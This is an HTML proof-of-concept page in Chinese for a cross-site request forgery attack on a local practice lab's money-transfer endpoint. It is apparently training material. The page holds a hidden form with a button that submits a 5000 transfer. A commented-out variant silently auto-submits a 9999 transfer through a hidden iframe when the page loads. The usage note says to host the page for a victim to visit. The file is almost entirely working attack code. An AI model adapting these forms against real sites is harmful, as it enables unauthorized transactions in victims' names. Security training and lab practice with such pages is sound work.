<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>CSRF PoC - 跨站请求伪造</title>
</head>
<body>
    <h1>CSRF 攻击 PoC</h1>
    <p>点击下方按钮，向靶场的转账接口发送 POST 请求。</p>

    <!-- 方法1：自动提交表单 -->
    <h3>方法1：自动提交表单</h3>
    <form id="csrf-form" action="http://127.0.0.1:5000/csrf/transfer" method="POST">
        <input type="hidden" name="amount" value="5000">
    </form>
    <button onclick="document.getElementById('csrf-form').submit()">执行 CSRF 攻击</button>

    <!-- 方法2：页面加载自动触发 -->
    <h3>方法2：页面加载自动触发（取消注释生效）</h3>
    <!--
    <iframe name="csrf-frame" style="display:none;"></iframe>
    <form id="csrf-auto" action="http://127.0.0.1:5000/csrf/transfer" method="POST" target="csrf-frame">
        <input type="hidden" name="amount" value="9999">
    </form>
    <script>document.getElementById('csrf-auto').submit();</script>
    -->

    <hr>
    <p style="color:#666;font-size:12px;">
        使用说明：将本文件放在任意位置双击打开，
        或托管到 http://127.0.0.1:8081/ 并由受害者访问。
    </p>
</body>
</html>
